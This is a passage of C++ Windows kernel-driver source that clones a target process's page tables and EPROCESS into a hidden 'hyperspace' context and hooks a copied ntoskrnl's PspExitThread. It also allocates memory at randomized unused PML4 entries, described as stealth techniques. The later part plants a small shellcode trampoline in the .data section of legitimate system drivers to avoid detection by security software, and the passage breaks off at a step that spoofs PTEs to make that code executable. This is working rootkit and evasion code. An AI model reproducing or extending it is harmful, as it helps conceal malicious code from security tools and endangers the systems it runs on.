      // create PDPTE
      pdpte.Present = 1;
      pdpte.Write = 1;
      pdpte.Supervisor = 0;
      pdpte.PageFrameNumber = PAGE_TO_PFN(pd_pa);

      if (!NT_SUCCESS(physical::write_physical_address(pdpte_pa, &pdpte, sizeof(pdpte)))) {
        log("ERROR", "failed to write PDPTE");
        return false;
      }

      info->new_pd_pa = pd_pa;
      log("INFO", "created new PD at PA 0x%llx", pd_pa);
    } else {
      pd_pa = PFN_TO_PAGE(pdpte.PageFrameNumber);
      log("INFO", "using existing PD at PA 0x%llx", pd_pa);
    }

    return true;
  }

  /**
   * @brief Map copied ntoskrnl pages into the hyperspace page tables
   * @param info Pointer to mapping information structure
   * @return true if mapping succeeded, false otherwise
   *
   * Creates PTEs pointing to the copied physical pages and constructs
   * complete virtual memory mapping for the ntoskrnl copy.
   */
  auto map_ntoskrnl_pages(ntoskrnl_mapping_info* info) -> bool {
    size_t total_pages = (info->original_size + PAGE_SIZE - 1) / PAGE_SIZE;

    log("INFO", "mapping %zu pages starting at PD index %u", total_pages, info->pd_index);

    // get list of allocated physical pages for ntoskrnl copy
    size_t allocated_page_idx = 0;

    for (size_t i = 0; i < total_pages; i++) {
      uint32_t current_pd_idx = info->pd_index + (i / 512);  // PD index (each PD covers 512 pages)
      uint32_t pt_idx = i % 512;                             // PT index within the PD

      if (pt_idx == 0) {
        // need new PT for this PD entry
        uintptr_t pt_pa = allocate_tracked_physical_page();
        if (!pt_pa) {
          log("ERROR", "failed to allocate PT for PD[%u]", current_pd_idx);
          return false;
        }

        // create PDE pointing to new PT
        PDE_64 pde = {0};
        pde.Present = 1;
        pde.Write = 1;
        pde.Supervisor = 0;
        pde.PageFrameNumber = PAGE_TO_PFN(pt_pa);

        uintptr_t pde_pa = info->new_pd_pa + current_pd_idx * 8;
        if (!NT_SUCCESS(physical::write_physical_address(pde_pa, &pde, sizeof(pde), true))) {
          log("ERROR", "failed to write PDE[%u] for physical address: 0x%llx", current_pd_idx,
              pde_pa);
          return false;
        }

        log("INFO", "created PT at PA 0x%llx for PD[%u]", pt_pa, current_pd_idx);
      }

      // read the PT physical address from PDE
      PDE_64 pde = {0};
      uintptr_t pde_pa = info->new_pd_pa + current_pd_idx * 8;
      if (!NT_SUCCESS(physical::read_physical_address(pde_pa, &pde, sizeof(pde), true))) {
        log("ERROR", "failed to read PDE[%u]", current_pd_idx);
        return false;
      }

      uintptr_t pt_pa = PFN_TO_PAGE(pde.PageFrameNumber);

      // create PTE pointing to copied ntoskrnl page
      // use the allocated pages in order (skip the page table pages)
      while (allocated_page_idx < g_ntoskrnl_copy_info.allocated_pages_count) {
        uintptr_t va = g_ntoskrnl_copy_info.allocated_pages[allocated_page_idx];
        uintptr_t pa = page_table::virtual_to_physical(reinterpret_cast<void*>(va)).QuadPart;

        // check if this is a page table page (allocated for PT/PD/PDPT)
        bool is_page_table = (pa == info->new_pdpt_pa || pa == info->new_pd_pa);

        // check if it's any of the PT pages we allocated
        for (size_t j = 0; j < total_pages; j += 512) {
          uint32_t check_pd_idx = info->pd_index + (j / 512);
          PDE_64 check_pde = {0};
          uintptr_t check_pde_pa = info->new_pd_pa + check_pd_idx * 8;
          if (NT_SUCCESS(physical::read_physical_address(check_pde_pa, &check_pde,
                                                         sizeof(check_pde), true))) {
            if (check_pde.Present && (check_pde.PageFrameNumber << 12) == pa) {
              is_page_table = true;
              break;
            }
          }
        }

        allocated_page_idx++;
        if (!is_page_table) {
          // this is a data page, use it
          PTE_64 pte = {0};
          pte.Present = 1;
          pte.Write = 1;
          pte.Supervisor = 0;
          pte.Global = 1;
          pte.ExecuteDisable = 0;  // allow execution
          pte.PageFrameNumber = PAGE_TO_PFN(pa);

          uintptr_t pte_pa = pt_pa + pt_idx * 8;
          if (!NT_SUCCESS(physical::write_physical_address(pte_pa, &pte, sizeof(pte), true))) {
            log("ERROR", "failed to write PTE[%u][%u]", current_pd_idx, pt_idx);
            return false;
          }

          break;
        }
      }
    }

    // flush caches/TLB
    page_table::flush_caches(reinterpret_cast<void*>(g_ntoskrnl_copy_info.hyperspace_base));
    page_table::flush_tlb();

    log("SUCCESS", "mapped all ntoskrnl pages");

    return true;
  }

  /**
   * @brief Install kernel function hooks within the hyperspace ntoskrnl copy
   * @return NTSTATUS indicating success or failure
   *
   * Applies function hooks to the copied kernel image in hyperspace context,
   * allowing for kernel-level interception without affecting the original kernel.
   */
  auto install_kernel_hooks_in_hyperspace() -> NTSTATUS {
    if (!g_ntoskrnl_copy_info.hyperspace_base) {
      log("ERROR", "ntoskrnl copy not created yet");
      return STATUS_UNSUCCESSFUL;
    }

    // calc offset from ntoskrnl base
    uintptr_t pspexit_offset = globals::psp_exit_thread - g_ntoskrnl_copy_info.original_base;
    log("INFO", "PspExitThread offset from ntoskrnl base: 0x%llx", pspexit_offset);

    // calc corresponding address in hyperspace copy
    uintptr_t hyperspace_pspexit = g_ntoskrnl_copy_info.hyperspace_base + pspexit_offset;
    log("INFO", "PspExitThread address in hyperspace: 0x%llx", hyperspace_pspexit);

    bool hook_result = pt_hook::install_hook_physical(
        globals::ctx.hyperspace_pml4_pa, hyperspace_pspexit,
        reinterpret_cast<uintptr_t>(hyperspace::PspExitThread), &g_pspexit_hook);

    if (!hook_result) {
      log("ERROR", "failed to install PspExitThread hook");
      return STATUS_UNSUCCESSFUL;
    }

    page_table::flush_caches(reinterpret_cast<void*>(g_ntoskrnl_copy_info.hyperspace_base));
    page_table::flush_tlb();

    return STATUS_SUCCESS;
  }

  /**
   * @brief Create a complete contextualized copy of ntoskrnl in hyperspace
   * @return NTSTATUS indicating success or failure
   *
   * Master function that orchestrates the entire process of copying ntoskrnl
   * into hyperspace with proper page tables, mapping, and hook installation.
   */
  auto create_contextualized_ntoskrnl() -> NTSTATUS {
    if (!globals::ctx.initialized) {
      log("ERROR", "hyperspace context not initialized");
      return STATUS_UNSUCCESSFUL;
    }

    // init page tracking
    if (!initialize_page_tracking()) {
      return STATUS_UNSUCCESSFUL;
    }

    // find ntoskrnl info
    if (!find_ntoskrnl_info(&g_ntoskrnl_copy_info.original_base,
                            &g_ntoskrnl_copy_info.original_size)) {
      return STATUS_UNSUCCESSFUL;
    }

    // use the same virtual address in hyperspace
    g_ntoskrnl_copy_info.hyperspace_base = g_ntoskrnl_copy_info.original_base;

    // create page table structure
    if (!create_ntoskrnl_page_tables(globals::ctx.hyperspace_pml4_pa, &g_ntoskrnl_copy_info)) {
      log("ERROR", "failed to create page tables");
      return STATUS_UNSUCCESSFUL;
    }

    // copy ntoskrnl pages
    if (!copy_ntoskrnl_pages(g_ntoskrnl_copy_info.original_base, g_ntoskrnl_copy_info.original_size,
                             g_ntoskrnl_copy_info.new_pd_pa)) {
      log("ERROR", "failed to copy ntoskrnl pages");
      return STATUS_UNSUCCESSFUL;
    }

    // map the copied pages
    if (!map_ntoskrnl_pages(&g_ntoskrnl_copy_info)) {
      log("ERROR", "failed to map ntoskrnl pages");
      return STATUS_UNSUCCESSFUL;
    }

    log("SUCCESS", "created contextualized copy of ntoskrnl in hyperspace at 0x%llx",
        g_ntoskrnl_copy_info.hyperspace_base);

    // install kernel hooks in hyperspace ctx
    NTSTATUS install_kernel_hooks_status = install_kernel_hooks_in_hyperspace();
    if (!NT_SUCCESS(install_kernel_hooks_status)) {
      log("WARNING", "failed to install kernel hooks in hyperspace context: 0x%x",
          install_kernel_hooks_status);
      return STATUS_UNSUCCESSFUL;
    }
    return STATUS_SUCCESS;
  }

  /**
   * @brief Clean up and free all resources used by the ntoskrnl copy
   *
   * Releases all tracked pages, page table structures, and associated memory
   * allocated during ntoskrnl copying operations.
   */
  auto cleanup_contextualized_ntoskrnl() -> void {
    // free all allocated pages
    for (size_t i = 0; i < g_ntoskrnl_copy_info.allocated_pages_count; i++) {
      uintptr_t va = g_ntoskrnl_copy_info.allocated_pages[i];
      globals::mm_free_independent_pages(va, PAGE_SIZE);
    }

    // free the tracking array itself
    if (g_ntoskrnl_copy_info.allocated_pages) {
      globals::mm_free_independent_pages(
          reinterpret_cast<uintptr_t>(g_ntoskrnl_copy_info.allocated_pages),
          g_ntoskrnl_copy_info.allocated_pages_capacity * sizeof(uintptr_t));
    }

    globals::memset(&g_ntoskrnl_copy_info, 0, sizeof(g_ntoskrnl_copy_info));

    page_table::flush_tlb();

    log("INFO", "cleaned up ntoskrnl deep copy");
  }

  /**
   * @brief Initialize list entries in cloned EPROCESS to prevent crashes
   * @param clone_eproc Pointer to the cloned EPROCESS structure
   *
   * Sets up empty list heads and clears problematic fields to ensure the
   * cloned process structure doesn't cause system instability.
   */
  auto initialize_cloned_eprocess_lists(PEPROCESS clone_eproc) -> void {
    // init _EPROCESS.ThreadListHead
    PLIST_ENTRY thread_list_head = reinterpret_cast<PLIST_ENTRY>(
        reinterpret_cast<uintptr_t>(clone_eproc) + globals::_eprocess_thread_list_head);
    InitializeListHead(thread_list_head);

    // init _KPROCESS.ThreadListHead
    PLIST_ENTRY kprocess_thread_list = reinterpret_cast<PLIST_ENTRY>(
        reinterpret_cast<uintptr_t>(clone_eproc) + globals::_kprocess_thread_list_head);
    InitializeListHead(kprocess_thread_list);

    // clear _EPROCESS.RundownProtect
    _EX_RUNDOWN_REF* rundown_ref = reinterpret_cast<_EX_RUNDOWN_REF*>(
        reinterpret_cast<uintptr_t>(clone_eproc) + globals::_eprocess_rundown_protect);

    InterlockedExchange64(reinterpret_cast<LONG64*>(&rundown_ref->Count), 0);
    InterlockedExchangePointer(reinterpret_cast<PVOID*>(&rundown_ref->Ptr), nullptr);

    // clear AccessLog to prevent MiEmptyPageAccessLog BSOD
    InterlockedExchangePointer(reinterpret_cast<PVOID*>(reinterpret_cast<uintptr_t>(clone_eproc) +
                                                        globals::_eprocess_vm + 0xE8),
                               nullptr);

    // set VadTrackingDisabled bit on hyperspace process
    ULONG* flags3_ptr_hyperspace = reinterpret_cast<ULONG*>(
        reinterpret_cast<uintptr_t>(clone_eproc) + globals::_eprocess_flags3);
    InterlockedOr(reinterpret_cast<LONG*>(flags3_ptr_hyperspace),
                  0x10);  // set bit 4

    // set VadTrackingDisabled bit on original process
    ULONG* flags3_ptr_og = reinterpret_cast<ULONG*>(
        reinterpret_cast<uintptr_t>(globals::ctx.orig_peproc) + globals::_eprocess_flags3);
    InterlockedOr(reinterpret_cast<LONG*>(flags3_ptr_og), 0x10);  // set bit 4

    _mm_mfence();

    log("INFO", "initialized list entries in cloned EPROCESS");
  }

  /**
   * @brief Locate PML4 self-reference entry in the original page table
   * @param cr3_pa Physical address of the original CR3/PML4
   * @return Structure containing self-reference entry information
   *
   * Finds the PML4 entry that points back to itself, which is used by
   * the system for recursive page table access.
   */
  auto find_pml4_self_reference_entry(uintptr_t cr3_pa) -> self_reference_entry_info {
    self_reference_entry_info info = {0, false, {0}};
    uintptr_t cr3_pfn = PAGE_TO_PFN(cr3_pa);

    log("INFO", "searching for PML4 self-reference entry (CR3 PFN: 0x%llx)", cr3_pfn);

    // check all PML4 entries (0-511)
    for (uint32_t idx = 0; idx < 512; idx++) {
      PML4E_64 pml4e = {0};
      if (NT_SUCCESS(physical::read_physical_address(cr3_pa + idx * sizeof(PML4E_64), &pml4e,
                                                     sizeof(PML4E_64)))) {
        // check if this entry is present and points back to the CR3
        if (pml4e.Present && pml4e.PageFrameNumber == cr3_pfn) {
          info.index = idx;
          info.found = true;
          info.original_entry = pml4e;
          log("SUCCESS", "found PML4 self-reference entry at index: %u", idx);
          break;
        }
      }
    }

    if (!info.found) {
      log("WARNING", "PML4 self-reference entry not found in original CR3");
    }

    return info;
  }

  /**
   * @brief Update self-reference entry in cloned PML4 to point to new PML4
   * @param cloned_pml4_va Virtual address of cloned PML4
   * @param cloned_pml4_pa Physical address of cloned PML4
   * @param self_reference_info Information about the self-reference entry
   * @return true if update succeeded, false otherwise
   *
   * Modifies the self-reference entry to maintain proper recursive page table
   * access in the hyperspace context.
   */
  auto update_cloned_self_reference_entry(uintptr_t cloned_pml4_va, uintptr_t cloned_pml4_pa,
                                          self_reference_entry_info self_reference_info) -> bool {
    if (!self_reference_info.found) {
      log("INFO", "no self-reference entry to update in cloned PML4");
      return true;
    }

    // calc the address of the self-reference entry in the cloned PML4
    uintptr_t self_reference_entry_va =
        cloned_pml4_va + (self_reference_info.index * sizeof(PML4E_64));

    // create new self-reference entry pointing to the cloned PML4's physical
    // address
    PML4E_64 new_self_reference_entry = self_reference_info.original_entry;
    new_self_reference_entry.PageFrameNumber = PAGE_TO_PFN(cloned_pml4_pa);

    // write the updated self-reference entry to the cloned PML4
    globals::memcpy(reinterpret_cast<void*>(self_reference_entry_va), &new_self_reference_entry,
                    sizeof(PML4E_64));

    log("SUCCESS",
        "updated self-reference entry at index %u to point to cloned PML4 (PFN: "
        "0x%llx)",
        self_reference_info.index, new_self_reference_entry.PageFrameNumber);

    return true;
  }

  /**
   * @brief Copy page tables with proper self-reference entry handling
   * @param dest_pml4_va Virtual address of destination PML4
   * @param src_pml4_pa Physical address of source PML4
   * @param dest_pml4_pa Physical address of destination PML4
   * @param self_reference_info Output parameter for self-reference information
   * @return true if copying succeeded, false otherwise
   *
   * Performs a complete PML4 copy while properly handling and updating
   * the self-reference entry for the new context.
   */
  auto copy_page_tables_with_self_reference_entry(uintptr_t dest_pml4_va, uintptr_t src_pml4_pa,
                                                  uintptr_t dest_pml4_pa,
                                                  self_reference_entry_info* self_reference_info)
      -> bool {
    // use RAII for temporary buffer
    raii::kernel_memory temp_buffer(PAGE_SIZE);
    if (!temp_buffer.is_valid()) {
      log("ERROR", "failed to allocate temp buffer for PML4 copy");
      return false;
    }

    *self_reference_info = find_pml4_self_reference_entry(src_pml4_pa);

    if (!NT_SUCCESS(physical::read_physical_address(src_pml4_pa, temp_buffer.get(), PAGE_SIZE))) {
      log("ERROR", "failed to read original PML4");
      return false;
    }

    globals::memcpy(reinterpret_cast<void*>(dest_pml4_va), temp_buffer.get(), PAGE_SIZE);

    if (!update_cloned_self_reference_entry(dest_pml4_va, dest_pml4_pa, *self_reference_info)) {
      log("ERROR", "failed to update self-reference entry in cloned PML4");
      return false;
    }

    return true;
  }

  /**
   * @brief Initialize complete hyperspace context with cloned page tables
   * @param target_pid Process ID to create hyperspace context for
   * @param ctx Pointer to hyperspace context structure
   * @return NTSTATUS indicating success or failure
   *
   * Master initialization function that creates a complete hyperspace context
   * including cloned PML4, EPROCESS, and all necessary supporting structures.
   */
  auto initialize_hyperspace_context(uint32_t target_pid, hyperspace_ctx* ctx) -> NTSTATUS {
    if (!ctx) {
      log("ERROR", "invalid hyperspace context");
      return STATUS_UNSUCCESSFUL;
    }

    PEPROCESS target_process = nullptr;
    if (globals::ps_lookup_process_by_process_id(reinterpret_cast<HANDLE>(target_pid),
                                                 &target_process) != STATUS_SUCCESS) {
      log("ERROR", "failed to lookup target process for hyperspace");
      return STATUS_UNSUCCESSFUL;
    }

    // use RAII but we need to release ownership since ctx will hold the reference
    raii::process_ref process_ref(target_process, "EPROCESS");

    ctx->orig_peproc = target_process;

    ctx->orig_pml4_pa = physical::get_process_directory_base(target_process);
    if (!ctx->orig_pml4_pa) {
      log("ERROR", "failed to get target process directory base");
      return STATUS_UNSUCCESSFUL;
    }

    // release ownership since ctx now owns the reference
    process_ref.release();

    log("INFO", "original PML4 PA: 0x%llx", ctx->orig_pml4_pa);

    ctx->hyperspace_pml4_va =
        reinterpret_cast<uintptr_t>(mem::allocate_independent_pages(PAGE_SIZE));
    if (!ctx->hyperspace_pml4_va) {
      log("ERROR", "failed to allocate hyperspace PML4");
      globals::obf_dereference_object(target_process);
      return STATUS_UNSUCCESSFUL;
    }

    ctx->hyperspace_pml4_pa =
        page_table::virtual_to_physical(reinterpret_cast<void*>(ctx->hyperspace_pml4_va)).QuadPart;
    if (!ctx->hyperspace_pml4_pa) {
      log("ERROR", "failed to get physical address of hyperspace PML4");
      globals::obf_dereference_object(target_process);
      return STATUS_UNSUCCESSFUL;
    }

    log("INFO", "hyperspace PML4 VA: 0x%llx, PA: 0x%llx", ctx->hyperspace_pml4_va,
        ctx->hyperspace_pml4_pa);

    self_reference_entry_info self_reference_info;
    if (!copy_page_tables_with_self_reference_entry(ctx->hyperspace_pml4_va, ctx->orig_pml4_pa,
                                                    ctx->hyperspace_pml4_pa,
                                                    &self_reference_info)) {
      log("ERROR", "failed to copy page tables with self-reference entry");
      globals::obf_dereference_object(target_process);
      return STATUS_UNSUCCESSFUL;
    }

    ctx->self_reference_entry_index = self_reference_info.index;
    ctx->has_self_reference_entry = self_reference_info.found;

    log("SUCCESS", "created hyperspace PML4 with %s self-reference entry",
        self_reference_info.found ? "updated" : "no");

    ctx->clone_peproc_page_base =
        reinterpret_cast<uintptr_t>(mem::allocate_independent_pages(PAGE_SIZE));

    if (!ctx->clone_peproc_page_base) {
      log("ERROR", "failed to allocate clone PEPROCESS");
      globals::obf_dereference_object(target_process);
      return STATUS_UNSUCCESSFUL;
    }

    const auto orig_peproc_page = (reinterpret_cast<uintptr_t>(ctx->orig_peproc) >> 12) << 12;
    const auto clone_peproc_offset = reinterpret_cast<uintptr_t>(ctx->orig_peproc) & 0xFFF;

    globals::memcpy(reinterpret_cast<void*>(ctx->clone_peproc_page_base),
                    reinterpret_cast<void*>(orig_peproc_page), PAGE_SIZE);

    ctx->clone_peproc =
        reinterpret_cast<PEPROCESS>(ctx->clone_peproc_page_base + clone_peproc_offset);

    initialize_cloned_eprocess_lists(ctx->clone_peproc);

    const auto dirbase_ptr = reinterpret_cast<uintptr_t*>(
        reinterpret_cast<uintptr_t>(ctx->clone_peproc) + globals::_kprocess_dirbase);

    *dirbase_ptr = ctx->hyperspace_pml4_pa;

    ctx->target_pid = target_pid;

    InterlockedExchange(reinterpret_cast<LONG*>(&ctx->initialized), TRUE);

    return STATUS_SUCCESS;
  }

  /**
   * @brief Allocate memory within hyperspace context using unused PML4 entries
   * @param target_pid Target process ID (unused in current implementation)
   * @param size Size of memory to allocate
   * @param mem_type Whether to use 4KB, 2MB or 1GB pages
   * @return Virtual address of allocated memory, or nullptr on failure
   *
   * Allocates memory within the hyperspace context using the same stealth
   * techniques as regular allocation but within the isolated address space.
   */
  auto allocate_in_hyperspace(uint32_t target_pid, size_t size, memory_type mem_type) -> void* {
    const size_t STANDARD_PAGE_SIZE = 0x1000;  // 4KB
    const size_t LARGE_PAGE_SIZE = 0x200000;   // 2MB
    const size_t HUGE_PAGE_SIZE = 0x40000000;  // 1GB

    const size_t page_size = (mem_type == memory_type::HUGE_PAGE)    ? HUGE_PAGE_SIZE
                             : (mem_type == memory_type::LARGE_PAGE) ? LARGE_PAGE_SIZE
                                                                     : STANDARD_PAGE_SIZE;
    const size_t page_mask = page_size - 1;
    const size_t page_shift = (mem_type == memory_type::HUGE_PAGE)    ? 30
                              : (mem_type == memory_type::LARGE_PAGE) ? 21
                                                                      : 12;

    const size_t aligned_size = (size + page_mask) & ~page_mask;
    const size_t page_count = aligned_size >> page_shift;

    PEPROCESS target_process = globals::ctx.clone_peproc;

    // get target process directory base
    const auto target_dir_base = physical::get_process_directory_base(target_process);
    if (!target_dir_base) {
      log("ERROR", "failed to lookup target process directory base");
      return nullptr;
    }

    uint32_t start_idx, end_idx;
    const char* space_type;
    page_table::get_pml4_search_range(false, &start_idx, &end_idx, &space_type);

    // validate index ranges
    if (!validation::validate_index_range(start_idx, end_idx, "PML4")) {
      validation::release_process_rundown_protection(target_process);
      globals::obf_dereference_object(target_process);
      return nullptr;
    }

    // select random available PML4 index
    auto selection = page_table::select_random_available_pml4(
        target_dir_base, start_idx, end_idx, (uintptr_t)target_process ^ target_pid);

    if (!selection.success) {
      validation::release_process_rundown_protection(target_process);
      globals::obf_dereference_object(target_process);
      log("ERROR", "failed to find any non-present PML4E in %s space", space_type);
      return nullptr;
    }

    // construct randomized virtual address
    uintptr_t base_va = page_table::construct_randomized_virtual_address(
        selection.selected_index, memory_space::USER_MODE, mem_type);

    log("INFO", "selected base address: 0x%llx for %s pages", base_va,
        mem_type == memory_type::HUGE_PAGE    ? "1GB"
        : mem_type == memory_type::LARGE_PAGE ? "2MB"
                                              : "4KB");

    auto write_pt_status = mem::write_page_tables(target_dir_base, base_va, page_count, mem_type);
    if (!NT_SUCCESS(write_pt_status)) {
      validation::release_process_rundown_protection(target_process);
      globals::obf_dereference_object(target_process);
      log("ERROR", "failed to write page tables, NTSTATUS: 0x%08X", write_pt_status);
      return nullptr;
    }

    log("SUCCESS", "allocated memory in hyperspace at 0x%llx", base_va);
    return reinterpret_cast<void*>(base_va);
  }

  /**
   * @brief Switch a thread's execution context to hyperspace
   * @param tid Thread ID to switch
   * @param ctx Pointer to hyperspace context
   * @return NTSTATUS indicating success or failure
   *
   * Modifies thread's ApcState.Process to point to the cloned EPROCESS,
   * effectively switching the thread to execute within hyperspace context.
   */
  auto switch_thread_context_to_hyperspace(uint32_t tid, hyperspace_ctx* ctx) -> NTSTATUS {
    if (InterlockedCompareExchange(reinterpret_cast<LONG*>(&ctx->initialized), FALSE, TRUE) !=
        TRUE) {
      log("ERROR", "invalid or uninitialized hyperspace context");
      return STATUS_UNSUCCESSFUL;
    }

    PETHREAD target_thread = nullptr;
    if (globals::ps_lookup_thread_by_thread_id(reinterpret_cast<HANDLE>(tid), &target_thread) !=
        STATUS_SUCCESS) {
      log("ERROR", "failed to lookup target thread");
      return STATUS_UNSUCCESSFUL;
    }

    // use RAII for thread reference
    raii::thread_ref thread_ref(target_thread, "ETHREAD");

    PEPROCESS* apc_process_ptr = reinterpret_cast<PEPROCESS*>(
        reinterpret_cast<uintptr_t>(target_thread) + globals::_kthread_apcstate_pkprocess);

    InterlockedExchangePointer(reinterpret_cast<PVOID*>(apc_process_ptr), ctx->clone_peproc);

    log("SUCCESS", "thread %d switched to hyperspace", tid);
    return STATUS_SUCCESS;
  }

  /**
   * @brief Switch thread back from hyperspace to original context
   * @param tid Thread ID to switch back
   * @param ctx Pointer to hyperspace context
   * @return true if switch succeeded, false otherwise
   *
   * Restores thread's original process context, returning it to normal
   * execution environment.
   */
  auto switch_from_hyperspace(uint32_t tid, hyperspace_ctx* ctx) -> bool {
    if (InterlockedCompareExchange(reinterpret_cast<LONG*>(&ctx->initialized), FALSE, TRUE) !=
        TRUE) {
      log("ERROR", "invalid or uninitialized hyperspace context");
      return false;
    }

    PETHREAD target_thread = nullptr;
    if (globals::ps_lookup_thread_by_thread_id(reinterpret_cast<HANDLE>(tid), &target_thread) !=
        STATUS_SUCCESS) {
      log("ERROR", "failed to lookup target thread");
      return false;
    }

    // use RAII for thread reference
    raii::thread_ref thread_ref(target_thread, "ETHREAD");

    PEPROCESS* apc_process_ptr = reinterpret_cast<PEPROCESS*>(
        reinterpret_cast<uintptr_t>(target_thread) + globals::_kthread_apcstate_pkprocess);

    InterlockedExchangePointer(reinterpret_cast<PVOID*>(apc_process_ptr), ctx->orig_peproc);

    log("INFO", "thread %d switched back from hyperspace", tid);
    return true;
  }

  /**
   * @brief Clean up hyperspace context and free all associated resources
   * @param ctx Pointer to hyperspace context to clean up
   *
   * Comprehensive cleanup function that releases PML4, EPROCESS clone,
   * and all other resources associated with the hyperspace context.
   */
  auto cleanup_hyperspace_context(hyperspace_ctx* ctx) -> void {
    if (InterlockedCompareExchange(reinterpret_cast<LONG*>(&ctx->initialized), FALSE, TRUE) !=
        TRUE) {
      log("ERROR", "invalid or uninitialized hyperspace context");
      return;
    }

    log("INFO", "cleaning up hyperspace context");

    // free hyperspace PML4 page
    if (ctx->hyperspace_pml4_va) {
      globals::mm_free_independent_pages(ctx->hyperspace_pml4_va, PAGE_SIZE);
      log("INFO", "freed hyperspace PML4 page");
    }

    // free cloned EPROCESS page
    // (causes bsod after a few seconds, this might be because the page is
    // automatically free'd once the process exits and another process ends up
    // using the pfn instead)
    if (ctx->clone_peproc_page_base) {
      globals::mm_free_independent_pages(ctx->clone_peproc_page_base, PAGE_SIZE);
    }

    // dereference original process
    if (ctx->orig_peproc) {
      globals::obf_dereference_object(ctx->orig_peproc);
      log("INFO", "dereferenced original EPROCESS");
    }

    // clear the context
    globals::memset(ctx, 0, sizeof(hyperspace_ctx));

    log("SUCCESS", "hyperspace context cleanup completed");
  }

  namespace callbacks {

    extern void* g_callback_shellcode_address = nullptr;
    extern void* g_process_callback_handle = nullptr;

    /**
     * @brief Process notification callback implementation for cleanup on exit
     * @param ParentId Parent process ID
     * @param ProcessId Process ID that created/terminated
     * @param Create TRUE for process creation, FALSE for termination
     *
     * Handles process termination events to trigger automatic cleanup
     * of hyperspace resources when the target process exits.
     */
    auto process_notify_callback_impl(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create) -> void {
      if (InterlockedCompareExchange(reinterpret_cast<LONG*>(&globals::ctx.initialized), FALSE,
                                     TRUE) != TRUE) {
        return;
      }

      // only handle the target process
      if (HandleToUlong(ProcessId) != globals::ctx.target_pid) {
        return;
      }

      // only handle process termination
      if (Create) {
        log("INFO", "target process %d created", HandleToUlong(ProcessId));
        return;
      }

      log("INFO", "target process %d terminating - cleaning up hyperspace",
          HandleToUlong(ProcessId));

      // cleanup hyperspace context when target process exits
      cleanup_hyperspace_context(&globals::ctx);

      // clean up contextualized ntoskrnl copy in hyperspace ctx
      cleanup_contextualized_ntoskrnl();

      // unregister the process callback to prevent further notifications
      if (g_process_callback_handle) {
        globals::ps_set_create_process_notify_routine_ex(
            reinterpret_cast<PCREATE_PROCESS_NOTIFY_ROUTINE_EX>(g_callback_shellcode_address),
            TRUE);
        g_process_callback_handle = nullptr;
        g_callback_shellcode_address = nullptr;
      }

      log("SUCCESS", "hyperspace cleanup completed for process %d", HandleToUlong(ProcessId));
    }

    /**
     * @brief Find a legitimate driver suitable for hosting callback shellcode
     * @param out_size Output parameter for driver size
     * @return Base address of suitable driver, or nullptr if none found
     *
     * Locates a legitimate system driver with proper flags for hosting
     * callback functions, avoiding detection by security software.
     */
    auto find_legitimate_driver_for_callbacks(PULONG out_size) -> void* {
      // common legitimate drivers that typically have proper flags for callbacks
      const wchar_t* legitimate_drivers[] = {L"classpnp.sys", L"disk.sys", L"volmgr.sys",
                                             L"partmgr.sys"};

      PLIST_ENTRY module_list = reinterpret_cast<PLIST_ENTRY>(globals::ps_loaded_module_list);
      if (!module_list) {
        log("ERROR", "PsLoadedModuleList not found");
        return nullptr;
      }

      for (PLIST_ENTRY entry = module_list->Flink; entry != module_list; entry = entry->Flink) {
        PKLDR_DATA_TABLE_ENTRY ldr_entry =
            CONTAINING_RECORD(entry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        // check each legitimate driver
        for (const auto& driver_name : legitimate_drivers) {
          if (ldr_entry->BaseDllName.Buffer &&
              globals::_wcsicmp(ldr_entry->BaseDllName.Buffer, driver_name) == 0) {
            // check if the driver has proper flags (bit 0x20 = supports callbacks)
            if (ldr_entry->Flags & 0x20) {
              log("INFO", "found legitimate driver for callbacks: %ws", driver_name);
              if (out_size) {
                *out_size = ldr_entry->SizeOfImage;
              }
              return ldr_entry->DllBase;
            }
          }
        }
      }

      // if no specific driver found, search for any driver with proper flags
      for (PLIST_ENTRY entry = module_list->Flink; entry != module_list; entry = entry->Flink) {
        PKLDR_DATA_TABLE_ENTRY ldr_entry =
            CONTAINING_RECORD(entry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        // skip ntoskrnl and hal
        if (ldr_entry->BaseDllName.Buffer &&
            (globals::_wcsicmp(ldr_entry->BaseDllName.Buffer, L"ntoskrnl.exe") == 0 ||
             globals::_wcsicmp(ldr_entry->BaseDllName.Buffer, L"hal.dll") == 0)) {
          continue;
        }

        // check for callback support flag
        if (ldr_entry->Flags & 0x20) {
          log("INFO", "found driver with callback support: %ws",
              ldr_entry->BaseDllName.Buffer ? ldr_entry->BaseDllName.Buffer : L"<unknown>");
          if (out_size) {
            *out_size = ldr_entry->SizeOfImage;
          }
          return ldr_entry->DllBase;
        }
      }

      log("ERROR", "no suitable driver found for callbacks");
      return nullptr;
    }

    /**
     * @brief Install process notification callback for automatic cleanup
     * @return NTSTATUS indicating success or failure
     *
     * Registers a process notification callback using shellcode placed in
     * a legitimate driver to trigger cleanup when the target process exits.
     */
    auto install_process_callback() -> NTSTATUS {
      if (InterlockedCompareExchangePointer(&g_callback_shellcode_address, nullptr, nullptr) !=
          nullptr) {
        return STATUS_SUCCESS;  // already installed
      }

      // find a legitimate driver to host the callback
      ULONG driver_size = 0;
      void* driver_base = find_legitimate_driver_for_callbacks(&driver_size);
      if (!driver_base) {
        log("ERROR", "failed to find legitimate driver for process callback");
        return STATUS_UNSUCCESSFUL;
      }

      // create shellcode that calls callback function
      uint8_t shellcode[12] = {
          0x48, 0xB8,  // mov rax, imm64
          0x00, 0x00, 0x00,
          0x00,  // placeholder for lower 32 bits of process_notify_callback_impl
          0x00, 0x00, 0x00,
          0x00,  // placeholder for upper 32 bits of process_notify_callback_impl
          0x50,  // push rax
          0xC3   // ret
      };

      // try and find .data section in the driver
      uint32_t section_size = 0;
      auto section_base = page_table::find_section_base(driver_base, &section_size, ".data", 5);
      if (!section_base) {
        return STATUS_UNSUCCESSFUL;
      }

      // find unused space for callback shellcode
      void* target_address =
          page_table::find_unused_space(section_base, section_size, globals::SHELL_SIZE);
      if (!target_address) {
        log("ERROR", "failed to find unused space for process callback shellcode "
                     "in legitimate driver");
        return STATUS_UNSUCCESSFUL;
      }

      // assign callback function pointer to shellcode
      *reinterpret_cast<uintptr_t*>(&shellcode[2]) =
          reinterpret_cast<uintptr_t>(process_notify_callback_impl);

      // write shellcode to legitimate driver section
      globals::memcpy(target_address, shellcode, globals::SHELL_SIZE);

      log("INFO", "process callback shellcode written at addr: 0x%p in legitimate driver",
          target_address);

      // spoof PTE to make the target address executable
